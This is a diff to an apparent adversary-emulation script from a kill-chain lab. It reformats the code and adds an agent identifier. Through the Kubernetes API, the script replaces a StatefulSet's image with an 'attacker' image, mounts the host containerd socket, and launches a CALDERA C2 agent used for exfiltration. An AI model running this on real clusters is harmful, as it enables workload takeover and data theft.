@@ -39,7 +39,12 @@ def api_server() -> str:
     return f"https://{host}:{port}"
 
 
-def k8s_request(method: str, path: str, body: dict[str, Any] | None = None, content_type: str = "application/json") -> dict[str, Any]:
+def k8s_request(
+    method: str,
+    path: str,
+    body: dict[str, Any] | None = None,
+    content_type: str = "application/json",
+) -> dict[str, Any]:
     if not TOKEN_FILE.is_file():
         raise RuntimeError(f"service account token not found: {TOKEN_FILE}")
 
@@ -85,12 +90,17 @@ def wait_for_statefulset_rollout(timeout: float, interval: float = 2.0) -> None:
 
         if observed >= generation and updated >= replicas and ready >= replicas:
             return
+
         if current != last_status:
             print(f"waiting for StatefulSet {NAMESPACE}/{STATEFULSET}: {current}")
             last_status = current
+
         time.sleep(interval)
 
-    raise RuntimeError(f"timed out waiting for StatefulSet {NAMESPACE}/{STATEFULSET} rollout: {last_status or 'unknown status'}")
+    raise RuntimeError(
+        f"timed out waiting for StatefulSet {NAMESPACE}/{STATEFULSET} rollout: "
+        f"{last_status or 'unknown status'}"
+    )
 
 
 def main() -> int:
@@ -98,12 +108,20 @@ def main() -> int:
     registry_port = os.getenv("REGISTRY_PORT", "5000")
     image_version = os.getenv("IMAGE_VERSION", "2.0.2")
     attacker_addr = os.getenv("ATTACKERADDR", "attacker")
+
     attacker_image = os.getenv("KC2_CHILD_IMAGE", f"{registry}:{registry_port}/nwdaf:{image_version}")
     caldera_url = os.getenv("CALDERA_URL", "http://caldera:8888")
+
     child_group = os.getenv("KC2_CHILD_GROUP", "outside")
     child_role = os.getenv("KC2_CHILD_ROLE", "child")
+
+    # PAW fisso del child agent. Serve allo step finale per cancellare
+    # esattamente questo agent da CALDERA dopo l'esfiltrazione.
+    child_paw = os.getenv("KC2_CHILD_PAW", "kc2-mongodb-nwdaf")
+
     socket_host_path = os.getenv("KC2_CONTAINERD_SOCKET", "/run/containerd/containerd.sock")
     socket_mount_path = os.getenv("KC2_CONTAINERD_SOCKET_MOUNT", "/host/run/containerd/containerd.sock")
+
     rollout_timeout = env_float("KC2_CHILD_ROLLOUT_TIMEOUT", 180.0, 1.0)
     agent_grace_seconds = env_float("KC2_CHILD_AGENT_GRACE_SECONDS", 20.0, 0.0)
 
@@ -140,6 +158,7 @@ def main() -> int:
                             "env": [
                                 {"name": "GROUP", "value": child_group},
                                 {"name": "KC_AGENT_ROLE", "value": child_role},
+                                {"name": "SANDCAT_PAW", "value": child_paw},
                                 {"name": "CALDERA_URL", "value": caldera_url},
                                 {"name": "WAIT", "value": "0"},
                                 {"name": "DATA_PATH", "value": "/tmp/KCData"},
@@ -168,18 +187,22 @@ def main() -> int:
 
     # Fail early with a readable message if the target does not exist or RBAC is insufficient.
     k8s_request("GET", f"/apis/apps/v1/namespaces/{NAMESPACE}/statefulsets/{STATEFULSET}", None)
+
     k8s_request(
         "PATCH",
         f"/apis/apps/v1/namespaces/{NAMESPACE}/statefulsets/{STATEFULSET}",
         patch,
         "application/strategic-merge-patch+json",
     )
+
     wait_for_statefulset_rollout(rollout_timeout)
+
     if agent_grace_seconds:
         print(f"waiting {agent_grace_seconds:g}s for KC2 child agent check-in")
         time.sleep(agent_grace_seconds)
 
     print(f"patched StatefulSet {NAMESPACE}/{STATEFULSET} with image {attacker_image}")
+    print(f"KC2 child agent PAW: {child_paw}")
     return 0
 
 
